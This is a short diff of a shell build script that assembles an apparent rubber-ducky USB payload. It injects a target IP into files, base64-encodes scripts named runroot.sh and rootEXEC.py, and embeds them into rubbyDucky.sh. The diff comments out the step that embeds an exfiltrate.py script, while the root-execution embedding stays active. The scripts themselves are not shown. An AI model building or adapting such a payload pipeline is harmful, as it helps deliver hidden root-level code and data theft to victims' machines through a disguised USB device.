@@ -19,14 +19,14 @@ find . -type f -exec sed -i "s/<REPLACE_IP>/$(cat ../builder/ip.txt)/g" {} \;
 
 base64 -w 0 runroot.sh > runroot.txt
 base64 -w 0 rootEXEC.py > py.txt
-base64 -w 0 exfiltrate.py > exfiltrate.txt
+# base64 -w 0 exfiltrate.py > exfiltrate.txt
 
 # {RUNROOT_BASE64} in rubbyDucky.sh will be replaced with runroot.txt
 # {PY_BASE64} in rubbyDucky.sh will be replaced with py.txt
 
 sed -i "s/{RUNROOT_BASE64}/$(cat runroot.txt)/g" rubbyDucky.sh
 sed -i "s/{PY_BASE64}/$(cat py.txt)/g" rubbyDucky.sh
-sed -i "s/{EXFILTRATE_BASE64}/$(cat exfiltrate.txt)/g" rubbyDucky.sh
+# sed -i "s/{EXFILTRATE_BASE64}/$(cat exfiltrate.txt)/g" rubbyDucky.sh
 
 echo "Created rubbyDucky.sh in build folder"
 
